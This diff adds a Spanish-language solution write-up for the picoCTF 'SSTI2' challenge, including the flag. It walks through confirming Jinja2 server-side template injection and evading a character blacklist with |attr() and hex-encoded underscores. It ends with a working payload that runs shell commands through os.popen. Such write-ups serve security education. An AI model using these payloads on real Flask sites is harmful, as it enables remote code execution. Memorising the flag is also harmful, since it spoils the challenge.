@@ -1,0 +1,50 @@
+SSTI2 - picoCTF - SOLUCIONADO
+==============================
+
+FLAG: picoCTF{sst1_f1lt3r_byp4ss_a9824e27}
+
+URL: http://shape-facility.picoctf.net:49830/
+
+RESUMEN DE LA SOLUCIÓN:
+-----------------------
+
+1. RECONOCIMIENTO:
+   - Sitio web con formulario POST que acepta parámetro "content"
+   - Servidor: Werkzeug/3.0.3 Python/3.8.10 (Flask + Jinja2)
+   - Vulnerable a Server Side Template Injection (SSTI)
+
+2. PRUEBA DE VULNERABILIDAD:
+   - Payload: {{7*7}} → retorna 49 (confirmando SSTI)
+   - Payload: {{config}} → retorna configuración de Flask
+
+3. IDENTIFICACIÓN DE FILTROS:
+   Caracteres bloqueados:
+   - Guión bajo (_) dentro de {{}}
+   - Operador suma (+)
+   - Corchetes ([])
+   - Asterisco (*) en comandos
+
+4. BYPASS DEL FILTRO:
+   - Técnica: Usar filtro |attr() con encoding hexadecimal
+   - Ejemplo: attr("\x5f\x5fglobals\x5f\x5f") para acceder a __globals__
+   - \x5f = carácter '_' en hexadecimal
+
+5. EXPLORACIÓN:
+   - Acceso a globals: {{lipsum|attr("\x5f\x5fglobals\x5f\x5f")}}
+   - Módulo os disponible en globals
+   - Ejecución de comandos: {{lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("comando")|attr("read")()}}
+
+6. OBTENCIÓN DE LA FLAG:
+   - Listar directorio: os.listdir("/challenge")
+   - Archivos encontrados: ['app.py', '__pycache__', 'flag', 'requirements.txt']
+   - Leer flag: cat /challenge/flag
+   
+PAYLOAD FINAL:
+{{lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("cat /challenge/flag")|attr("read")()}}
+
+LECCIONES APRENDIDAS:
+---------------------
+1. Los filtros basados en blacklist son vulnerables a bypass
+2. El encoding hexadecimal (\xNN) puede evadir filtros de caracteres
+3. El filtro |attr() de Jinja2 permite acceso dinámico a atributos
+4. La función lipsum está disponible por defecto en Jinja2 y tiene acceso a __globals__
